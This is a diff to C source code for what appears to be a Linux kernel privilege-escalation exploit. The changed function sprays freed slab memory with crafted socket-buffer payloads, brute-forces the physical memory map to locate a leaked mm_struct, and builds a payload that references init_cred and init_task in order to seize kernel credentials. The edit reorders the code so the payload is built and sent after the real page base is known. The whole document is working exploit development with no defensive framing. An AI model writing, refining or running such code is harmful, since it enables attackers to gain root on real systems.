@@ -195,23 +195,16 @@ static uint64_t prepare_kernel_page(uint64_t stext, uint64_t init_cred,
     for (size_t i=0;i<post_cnt;i++){close(post_fd[i]);kill(post_ch[i],SIGKILL);waitpid(post_ch[i],NULL,0);}
     for (size_t i=0;i<spray_cnt;i+=mm_per_slab){close(spray_fd[i]);kill(spray_ch[i],SIGKILL);waitpid(spray_ch[i],NULL,0);}
 
-    /* ── SKB spray: fill freed slab with payload ── */
+    /* ── SKB spray: send shaping packet then get page_base, rebuild with correct base ── */
     uint8_t *skb_buf = malloc(SKB_SEND_SIZE);
     int sv[2]; SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sv));
     int sndbuf=1<<20;
     setsockopt(sv[0],SOL_SOCKET,SO_SNDBUF,&sndbuf,sizeof(sndbuf));
     int fl=fcntl(sv[0],F_GETFL,0); if(fl>=0) fcntl(sv[0],F_SETFL,fl|O_NONBLOCK);
-    int sv2[2]; SYSCHK(socketpair(AF_UNIX,SOCK_STREAM,0,sv2));
-
-    /* We don't know page_base yet, build with placeholder */
-    uint64_t placeholder_base = 0xdead000000000000ULL;
-    build_skb_payload(skb_buf, placeholder_base, stext, init_cred,
-                      init_task, root_tg, mode, target, child_node);
 
     struct iovec iov={.iov_base=skb_buf,.iov_len=SKB_SEND_SIZE};
     struct msghdr msg; memset(&msg,0,sizeof(msg));
     msg.msg_iov=&iov; msg.msg_iovlen=1;
-    SYSCHK(sendmsg(sv2[0],&msg,0));
 
     /* close pre/post/spray fds to let slab be reclaimed */
     pin_to_core(0); sched_yield(); sched_yield();
@@ -219,17 +212,7 @@ static uint64_t prepare_kernel_page(uint64_t stext, uint64_t init_cred,
     for (size_t i=0;i<post_cnt;i++) if(post_fd[i]>0){close(post_fd[i]);post_fd[i]=-1;}
     for (size_t i=0;i<spray_cnt;i+=mm_per_slab)
         if(spray_fd[i]>0){close(spray_fd[i]);spray_fd[i]=-1;}
-
-    close(sv2[0]); close(sv2[1]);
     sched_yield(); sched_yield();
-    /* NOTE: keep memfd_leak OPEN so mm_struct stays in slab for bruteforce */
-
-    /* Send reclaim sprays */
-    for (int i=0;i<4;i++){
-        errno=0;
-        ssize_t sent=sendmsg(sv[0],&msg,MSG_DONTWAIT);
-        if(sent<=0) break;
-    }
 
     /* ── brute-force physmap to find leaked mm_struct ── */
     waitpid(leak_ch,NULL,0);
@@ -275,14 +258,10 @@ static uint64_t prepare_kernel_page(uint64_t stext, uint64_t init_cred,
     uint64_t page_base = leaked & ~((uint64_t)ORDER3_SIZE - 1);
     fprintf(stderr,"[*] page_base: %llx\n",(unsigned long long)page_base);
 
-    /* Rebuild skb with real page_base */
+    /* Build SKB payload with real page_base and send to reclaim the freed slab */
     build_skb_payload(skb_buf, page_base, stext, init_cred,
                       init_task, root_tg, mode, target, child_node);
-
-    /* Send real payload */
-    for (int i=0;i<4;i++){
-        sendmsg(sv[0],&msg,MSG_DONTWAIT);
-    }
+    for (int i=0;i<4;i++) sendmsg(sv[0],&msg,MSG_DONTWAIT);
 
     close(sv[0]); close(sv[1]);
     free(skb_buf);
